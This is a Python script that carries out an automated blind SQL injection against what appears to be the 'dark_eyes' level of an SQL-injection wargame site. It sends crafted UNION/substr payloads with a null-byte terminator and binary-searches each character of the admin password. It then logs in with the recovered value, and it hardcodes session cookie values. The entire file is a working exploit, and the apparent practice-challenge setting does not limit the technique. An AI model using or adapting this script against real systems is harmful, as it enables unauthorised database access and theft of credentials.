import requests
import re

URL = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?"
cookie = {
    "__cfduid":"d33f226e52742a4101c7fa523b51564201526036891",
    "PHPSESSID":"vd1msq4gqslasr388ldc4oeop6"
}

s = requests.Session()
pw = ""

for i in range(100):
    low = 32
    high= 126
    while True:
        mid = int((low+high)/2)

        data = "pw=' or id='admin' and (select 1 union select ord(substr(pw,"+str(i+1)+",1))="+str(low)+");%00"
        req1 = s.get(URL+data,cookies=cookie)
        if req1.text.find("php") >-1 :
            pw = pw+chr(low)
            print (pw)
            break

        data = "pw=' or id='admin' and (select 1 union select ord(substr(pw,"+str(i+1)+",1))="+str(high)+");%00"
        req1 = s.get(URL+data,cookies=cookie)
        if req1.text.find("php") >-1 :
            pw = pw+chr(high)
            print (pw)
            break

        data = "pw=' or id='admin' and (select 1 union select ord(substr(pw,"+str(i+1)+",1))="+str(mid)+");%00"
        req1 = s.get(URL+data,cookies=cookie)
        if req1.text.find("php") >-1 :
            pw = pw+chr(mid)
            print (pw)
            break

        data = "pw=' or id='admin' and (select 1 union select ord(substr(pw,"+str(i+1)+",1))>"+str(mid)+");%00"
        req1 = s.get(URL+data,cookies=cookie)
        if req1.text.find("php") >-1 :
            low = mid +1

        data = "pw=' or id='admin' and (select 1 union select ord(substr(pw,"+str(i+1)+",1))<"+str(mid)+");%00"
        req1 = s.get(URL+data,cookies=cookie)
        if req1.text.find("php") >-1 :
            high = mid -1

        if low >= high:
            print ("no more chr !!")
            print ("Password is : "+pw+" or "+pw.lower())
            data = "pw="+pw
            s.get(URL+data,cookies=cookie)
            data = "pw="+pw.lower()
            s.get(URL+data,cookies=cookie)
            break